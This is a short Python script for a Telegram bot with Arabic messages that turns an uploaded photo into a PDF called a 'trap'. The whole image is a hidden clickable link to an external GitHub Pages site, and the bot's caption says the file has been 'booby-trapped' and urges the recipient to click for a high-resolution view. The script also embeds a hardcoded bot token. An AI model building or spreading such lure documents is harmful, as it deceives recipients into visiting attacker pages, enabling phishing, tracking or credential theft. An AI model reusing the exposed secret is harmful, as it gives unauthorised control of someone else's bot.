import telebot
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import A4
import os

# التوكن الجديد الخاص بك
TOKEN = "8582826692:AAE1hq_9e5Qxic4BHGPqt6EwTD4ZEnUsWCY"
bot = telebot.TeleBot(TOKEN)
MY_LINK = "https://jeannettaleath-ship-it.github.io/MAX191/"

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "مرحباً بك في EROXX. أرسل صورتك الآن لتحويلها لملف PDF تفاعلي.")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        img_name = "temp_image.jpg"
        with open(img_name, "wb") as f:
            f.write(downloaded_file)

        pdf_name = "trap_6969597735.pdf"
        c = canvas.Canvas(pdf_name, pagesize=A4)
        width, height = A4
        
        # رسم الصورة وإضافة الرابط
        img_w, img_h = 450, 450
        x = (width - img_w) / 2
        y = (height - img_h) / 2
        c.drawImage(img_name, x, y, width=img_w, height=img_h)
        c.linkURL(MY_LINK, (x, y, x + img_w, y + img_h), relative=1)
        
        c.showPage()
        c.save()

        with open(pdf_name, "rb") as pdf:
            bot.send_document(message.chat.id, pdf, caption="📄 تم التلغيم! عند فتح الملف، اضغط على الصورة لمشاهدتها بدقة عالية.")

        os.remove(img_name)
        os.remove(pdf_name)
    except Exception as e:
        bot.reply_to(message, "⚠️ حدث خطأ في معالجة الملف.")

bot.polling()
